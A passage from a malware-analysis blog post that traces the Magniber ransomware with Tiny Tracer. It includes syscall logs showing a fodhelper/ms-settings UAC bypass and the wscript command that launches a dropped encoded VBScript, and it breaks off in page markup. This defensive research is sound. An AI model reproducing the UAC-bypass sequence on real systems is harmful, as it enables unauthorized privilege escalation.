<figure class="wp-block-image size-full"><img data-attachment-id="8755" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/export_table-2/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png" data-orig-size="536,324" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="export_table" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png?w=536" loading="lazy" width="536" height="324" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png" alt="" class="wp-image-8755" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png 536w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png?w=150&amp;h=91 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png?w=400&amp;h=242 400w" sizes="(max-width: 536px) 100vw, 536px" /></figure>



<p>This is where the execution of the binary starts. </p>



<h3 class="wp-block-heading">Overview of Magniber&#8217;s DLL</h3>



<p>If we try to open this binary in IDA, we can clearly see that this binary is obfuscated. The execution starts from a single call&#8230; </p>



<figure class="wp-block-image size-large"><img data-attachment-id="9193" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/inside_export/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png" data-orig-size="414,421" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="inside_export" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=295" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=414" loading="lazy" width="414" height="421" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=414" alt="" class="wp-image-9193" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png 414w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=148 148w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=295 295w" sizes="(max-width: 414px) 100vw, 414px" /></figure>



<p>&#8230;that leads into a &#8220;rabbithole&#8221; of jumps&#8230;</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9195" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/jumps_list/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png" data-orig-size="735,633" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="jumps_list" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=348" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=640" loading="lazy" width="735" height="633" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=735" alt="" class="wp-image-9195" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png 735w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=348 348w" sizes="(max-width: 735px) 100vw, 735px" /></figure>



<p>How can we analyze the ransomware inner workings, when it is so hard to even find the relevant code? It isn&#8217;t as hard as it seems if we involve DBI (Dynamic Binary Instrumentation) tools, such as Pin-based <a href="https://github.com/hasherezade/tiny_tracer" target="_blank" rel="noreferrer noopener">Tiny Tracer</a>.</p>



<h3 class="wp-block-heading">Tracing the first stage executable</h3>



<p>Let&#8217;s dive into the sample by tracing it with <a href="https://github.com/hasherezade/tiny_tracer">Tiny Tracer</a> (you can find the installation instructions <a href="https://github.com/hasherezade/tiny_tracer/wiki/Installation" target="_blank" rel="noreferrer noopener">here</a>). To makes things easier, I converted the DLL into EXE (as described <a href="https://hshrzd.wordpress.com/2016/07/21/how-to-turn-a-dll-into-a-standalone-exe/">here</a>), changing its entry point to the exported function (since the <code>DllMain</code> does not do much in this case, and the exported function takes no parameters, we should be able to simply redirect it). </p>



<p>However, on the attempt of tracing it, I&#8217;ve got an unpleasant surprise. The Pin Tracer terminated with an error:</p>



<pre class="wp-block-preformatted">Pin: pin-3.25-98650-8f6168173
Copyright 2002-2022 Intel Corporation.
E:  UPC Dispatcher: Unhandled internal exception in Pin or tool. ThreadId = 0 SysThreadId = 3348. Interruption context: IP: 0x0725c6ad0 SP: 0x001b0e290. Exception Code: RECEIVED_ACCESS_FAULT. Exception Address = 0x0725c6ad0. Access Type: READ. Access Address = 0x2792246e3. ExceptionFlags: 0x000000000</pre>



<p>It is not very intuitive to guess what caused such error. Fortunately, from the previous experience I know what it could be: some corruptions in the PE format itself. By looking at the Magniber executable in <a href="https://hshrzd.wordpress.com/pe-bear/" target="_blank" rel="noreferrer noopener">PE-bear</a>, I found the suspected cause &#8211; malformed data directories:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8759" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/table-2/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png" data-orig-size="620,639" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="table" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=291" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=620" loading="lazy" width="620" height="639" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=620" alt="" class="wp-image-8759" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png 620w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=146 146w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=291 291w" sizes="(max-width: 620px) 100vw, 620px" /></figure>



<p>I cleaned it up, by removing the invalid entries:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8799" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/cleaned_data_dir/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png" data-orig-size="580,537" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cleaned_data_dir" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=324" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=580" loading="lazy" width="580" height="537" src="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=580" alt="" class="wp-image-8799" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png 580w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=324 324w" sizes="(max-width: 580px) 100vw, 580px" /></figure>



<p>Then made another attempt. This time the tracing continues cleanly.</p>



<p>This is the fragment of the tracelog made with default Tiny Tracer&#8217;s settings:</p>



<pre class="wp-block-preformatted">f069;section: [.swicc]
10c4;called: ?? [13240000+0]
&gt; 13240000+20;called: ?? [1324d000+53d]
&gt; 13240000+55;called: ?? [13270000+0]
&gt; 13240000+ca;called: ?? [13270000+0]
&gt; 13240000+229;called: ?? [13330000+0]
&gt; 13240000+272;called: ?? [13370000+0]
&gt; 13240000+229;called: ?? [13390000+0]
&gt; 13240000+272;called: ?? [133d0000+0]</pre>



<p>It doesn&#8217;t give us much information, apart  from the fact that the execution quickly switched to some newly allocated block of code (probably a shellcode or a section unpacked in memory). To get more details, make sure that following settings are set in TinyTracer.ini:</p>



<pre class="wp-block-preformatted">FOLLOW_SHELLCODES=3
TRACE_SYSCALL=True</pre>



<p>This time we can see something more interesting &#8211; it turns out the malware uses raw syscalls!</p>



<pre class="wp-block-preformatted">f069;section: [.swicc]
ef24;SYSCALL:0x18(NtAllocateVirtualMemory)
10c4;called: ?? [14bd0000+0]
&gt; 14bd0000+20;called: ?? [14bdd000+53d]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+55;called: ?? [14be0000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+ca;called: ?? [14be0000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+229;called: ?? [14c90000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+272;called: ?? [14cd0000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14bd0000+229;called: ?? [14cf0000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
[...]</pre>



<p>At this point we can already read from the tracelog where the &#8220;rabbit hole&#8221; ends. The new memory is allocated (using the syscall), the content of shellcode is copied there, and executed. The execution is redirected to the shellcode at the RVA = <code>0x10c4</code> in the Magniber&#8217;s executable. We can set the breakpoint at this offset in a debugger, and dump this shellcode for further analysis (it is <a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank">shellcode#1</a>). </p>



<p>But for now, let&#8217;s continue with the tracing of the main executable, and see what we can learn from it&#8230;</p>



<p>There are some back-and-forth calls between the different pieces of a shellcode, so, in order to avoid the noise, I am gonna filter it out by changing yet another  option in TinyTracer.ini:</p>



<pre class="wp-block-preformatted">LOG_SHELLCODES_TRANSITIONS=False</pre>



<p>And we can try tracing it again. This is what I got this time:</p>



<pre class="wp-block-preformatted">f069;section: [.swicc]
ef24;SYSCALL:0x18(NtAllocateVirtualMemory)
10c4;called: ?? [14bd0000+0]
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14c90000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14cd0000+8;SYSCALL:0x26(NtOpenProcess)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14cf0000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14d30000+8;SYSCALL:0x26(NtOpenProcess)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14d70000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14d80000+8;SYSCALL:0x26(NtOpenProcess)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14d90000+8;SYSCALL:0x34(NtDelayExecution)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 14da0000+8;SYSCALL:0x26(NtOpenProcess)
&gt; 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
[...]
&gt; 170f7000+6cb;SYSCALL:0x8(NtWriteFile)
&gt; 170f7000+6b5;SYSCALL:0xf(NtClose)
&gt; 170f7000+6aa;SYSCALL:0x34(NtDelayExecution)
&gt; 170f2000+cc3;ntdll.RtlCreateProcessParametersEx
&gt; 170f7000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
&gt; 170f7000+841;SYSCALL:0xc8(NtCreateUserProcess)</pre>



<p>Complete tracelog available here: <a href="https://gist.github.com/hasherezade/aa969e7c431023afabffef9f881616c2" target="_blank" rel="noreferrer noopener">magni.tag</a></p>



<p>At the end PIN dumped <code>pin.log</code> file informing about an error:</p>



<pre class="wp-block-preformatted">Pin: pin-3.26-98690-1fc9d60e6
Copyright 2002-2022 Intel Corporation.
A: C:\tmp_proj\pinjen\workspace\pypl-pin-nightly\GitPin\Source\pin\vm_w\follow_child_windows.cpp: LEVEL_VM::WIN_FOLLOW_CHILD::NotifyAfterCreateUserProcess: 129: assertion failed: suspended</pre>



<p>This time the error informs that the traced process created a child, which Tiny Tracer failed to follow (indeed we can see in the log file the last called function is <code>NtCreateUserProcess</code>). This situation is normal.</p>



<p>As we can see, the majority of the logged functions are called by syscalls. There are just a few functions here and there that are called directly from a DLL, such as <code>RtlCreateProcessParametersEx</code>, <code>RtlInitUnicodeString</code>. </p>



<p>The next thing that we can do in order to get more information about what is going on, is to dump arguments of the functions. This can be easily done with Tiny Tracer, by editing <strong><em>params.txt</em></strong> list (<a href="https://github.com/hasherezade/tiny_tracer/wiki/Tracing-parameters-of-functions">more info on project Wiki</a>). Since Tiny Tracer v2.3 we can also <a href="https://github.com/hasherezade/tiny_tracer/wiki/Tracing-syscalls">log syscalls arguments</a>. In this case, we will log the syscalls arguments referencing them by the corresponding functions from NTDLL.</p>



<p>I prepared a list relevant for the above tracelog (gist: <a href="https://gist.github.com/hasherezade/19aee3fedb8f1c0b62c4f62cddf752eb">params.txt</a>):</p>



<pre class="wp-block-preformatted">ntdll;RtlCreateProcessParametersEx;10
ntdll;RtlInitUnicodeString;2
ntdll;NtAllocateVirtualMemory;6
ntdll;NtQuerySystemInformation;4
ntdll;NtOpenProcess;4
ntdll;NtWriteVirtualMemory;5
ntdll;NtCreateThreadEx;11
ntdll;NtResumeThread;2
ntdll;NtQueryPerformanceCounter;2
ntdll;NtOpenFile;6
ntdll;NtQueryVolumeInformationFile;5
ntdll;NtOpenKey;3
ntdll;NtEnumerateKey;6
ntdll;NtWriteFile;9
ntdll;NtSetValueKey;6
ntdll;NtCreateUserProcess;10
ntdll;NtCreateFile;10</pre>



<p>I traced it again, with the changed settings. This time tracelog revealed the strings that were referenced by this functions. Fragment:</p>



<pre class="wp-block-preformatted">[...]
&gt; 17353000+df9;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"\Registry\User\"
	Arg[1] = ptr 0x0000000017c80000 -&gt; L"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"</strong>

&gt; 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -&gt; {\xff\xff\xff\xff\xff\xff\xff\xff}
	Arg[1] = ptr 0x00000000000f003f -&gt; {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -&gt; L"0"

&gt; 17353000+e4e;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"
	Arg[1] = ptr 0x00000000174bf9c0 -&gt; L"Shell"</strong>

&gt; 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -&gt; {\x04\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -&gt; {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -&gt; L"0"

&gt; 17353000+ea2;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"Shell"
	Arg[1] = ptr 0x00000000174bf9b0 -&gt; L"Open"</strong>

&gt; 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -&gt; {\x08\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -&gt; {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -&gt; L"0"

&gt; 17353000+ef6;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"Open"
	Arg[1] = ptr 0x00000000174bf9e0 -&gt; L"command"</strong>

&gt; 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -&gt; {\x0c\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -&gt; {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -&gt; L"0"

&gt; 17353000+f49;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	<strong>Arg[0] = ptr 0x00000000174bf900 -&gt; U"command"</strong>
	Arg[1] = ptr 0x00000000174bfaf0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}

&gt; 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000210 = 528
	Arg[1] = ptr 0x00000000174bf900 -&gt; {\x00\x00\x02\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
<strong>	Arg[4] = ptr 0x0000000017bd0000 -&gt; L"wscript.exe /B /E:VBScript.Encode ../../Users/Public/vybmaryqycp.mnxu"</strong>
	Arg[5] = 0x000000000000008a = 138

&gt; 17353000+f86;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -&gt; {\x00\x00\x02\x00\x00\x00\x00\x00}
	<strong>Arg[1] = ptr 0x00000000174bfa28 -&gt; L"DelegateExecute"</strong>

&gt; 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000210 = 528
	<strong>Arg[1] = ptr 0x00000000174bf900 -&gt; U"DelegateExecute"</strong>
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
	Arg[4] = ptr 0x00000000174bfaf0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = 0x0000000000000004 = 4

&gt; 17357000+6b5;SYSCALL:0xf(NtClose)
&gt; 17357000+689;SYSCALL:0x1e(NtFreeVirtualMemory)
&gt; 17354000+1b;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"DelegateExecute"
	Arg[1] = ptr 0x00000000174bf9f0 -&gt; L"ms-settings"</strong>

&gt; 17357000+718;SYSCALL:0x1d(NtCreateKey)
&gt; 17354000+87;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
<strong>	Arg[0] = ptr 0x00000000174bf900 -&gt; U"ms-settings"
	Arg[1] = ptr 0x00000000174bf9d0 -&gt; L"CurVer"</strong>

&gt; 17357000+718;SYSCALL:0x1d(NtCreateKey)
&gt; 17354000+f4;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -&gt; U"CurVer"
	Arg[1] = ptr 0x00000000174bfaf0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}

&gt; 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000214 = 532
	Arg[1] = ptr 0x00000000174bf900 -&gt; {\x00\x00\x02\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
	Arg[4] = ptr 0x0000000017c80000 -&gt; L"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"
	Arg[5] = 0x0000000000000048 = 72

&gt; 17357000+6b5;SYSCALL:0xf(NtClose)
&gt; 17357000+6b5;SYSCALL:0xf(NtClose)
&gt; 17357000+6aa;SYSCALL:0x34(NtDelayExecution)
&gt; 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x00000000174bf8c0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x00000000174bf8c8 -&gt; L"J"
	Arg[4] = 0x0df06fa200001000 = 1004425458479009792
	Arg[5] = 0x3548001a00000004 = 3839318794002497540

&gt; 17357000+6c0;SYSCALL:0x55(NtCreateFile)
NtCreateFile:
	Arg[0] = ptr 0x00000000174bf8b0 -&gt; {\xff\xff\xff\xff\xff\xff\xff\xff}
	Arg[1] = ptr 0x0000000000120116 -&gt; {\x00\x00\xf0*\x9a\x02\x00\x00}
	Arg[2] = ptr 0x00000000174bf840 -&gt; L"0"
	Arg[3] = ptr 0x00000000174bf830 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0
	Arg[5] = 0x3548001a00000080 = 3839318794002497664
	Arg[6] = 0x7a20201200000002 = 8800068933563449346
	Arg[7] = 0x3478478a00000005 = 3780850545208590341
	Arg[8] = 0x3c506e8200000020 = 4346095145037332512
	Arg[9] = 0

&gt; 17357000+6cb;SYSCALL:0x8(NtWriteFile)
NtWriteFile:
	Arg[0] = 0x0000000000000200 = 512
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x00000000174bf810 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
<strong>	Arg[5] = ptr 0x000000001735cdbf -&gt; {#@~^YQIA}</strong>
	Arg[6] = 0x7a2020120000027c = 8800068933563449980
	Arg[7] = 0
	Arg[8] = 0

&gt; 17357000+6b5;SYSCALL:0xf(NtClose)
&gt; 17357000+6aa;SYSCALL:0x34(NtDelayExecution)
&gt; 17352000+cc3;ntdll.RtlCreateProcessParametersEx
RtlCreateProcessParametersEx:
	Arg[0] = ptr 0x00000000174bf8b0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000174bf7f0 -&gt; U"\??\C:\Windows\System32\cmd.exe"
	Arg[2] = 0
	Arg[3] = 0
<strong>	Arg[4] = ptr 0x00000000174bf800 -&gt; U"/c fodhelper.exe"</strong>
	Arg[5] = 0
	Arg[6] = 0
	Arg[7] = 0
	Arg[8] = 0
	Arg[9] = 0

&gt; 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x00000000174bf8c0 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x00000000174bf8b8 -&gt; L" "
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4
<strong>
&gt; 17357000+841;SYSCALL:0xc8(NtCreateUserProcess)</strong>
NtCreateUserProcess:
	Arg[0] = ptr 0x00000000174bf810 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000174bf8c8 -&gt; {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0x00000000001fffff = 2097151
	Arg[3] = 0x00000000001fffff = 2097151
	Arg[4] = 0
	Arg[5] = 0
	Arg[6] = 0
	Arg[7] = 0
	Arg[8] = ptr 0x000000000046a610 -&gt; {\xc8\x06\x00\x00\xc8\x06\x00\x00}
	Arg[9] = ptr 0x00000000174bf820 -&gt; L"X"
</pre>



<p><em>Complete log available here: <a rel="noreferrer noopener" href="https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5" target="_blank">magni.exe</a><a href="https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5" target="_blank" rel="noreferrer noopener">.</a><a rel="noreferrer noopener" href="https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5" target="_blank">tag</a>.</em></p>



<p>As we can see, at the end the application executed &#8220;fodhelper.exe&#8221;. Googling for the related strings lead us to the following PoC: <a rel="noreferrer noopener" href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" target="_blank">FodhelperBypass.ps1</a>. As we can see, this system application was used in one of the technique of UAC (User Account Bypass), meant to elevate privileges on Windows. Comparing the strings used by the malware with the ones used in the PoC, as well as their order, and the context of usage, we can find a big overlap that allows to guess that this indeed was a UAC technique used by Magniber.</p>



<p>Then we reach the aforementioned point where the Tiny Tracer is not able to follow the child process, so the execution terminates. At first, I thought to get more luck by running Magniber directly as an Administrator, so that it will skip the process creation, that is a part of its UAC technique. Unfortunately, the UAC is executed regardless the malware is deployed elevated or not. For now we will just continue the analysis with what we have.</p>



<h3 class="wp-block-heading">The VBE script</h3>



<p>We can see in the log a line referencing a VBScript: </p>



<pre class="wp-block-preformatted"><strong>L"wscript.exe /B /E:VBScript.Encode ../../Users/Public/vybmaryqycp.mnxu"</strong></pre>



<p>Indeed this script is dropped (under a pseudo-random name) into C:/Users/Public.</p>



<p>This script is in an encrypted form (VBE), but it can be deobfuscated easily using public tools, i.e. <a rel="noreferrer noopener" href="https://master.ayra.ch/vbs/vbs.aspx" target="_blank">this one</a>. The resulting content:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<style>.gist table { margin-bottom: 0; }</style><div style="tab-size: 8" id="gist121503331" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-magni_decoded-vbs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-vbscript  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template">
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="{{ revealButtonHref }}" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div></template>
<template class="js-line-alert-template">
  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
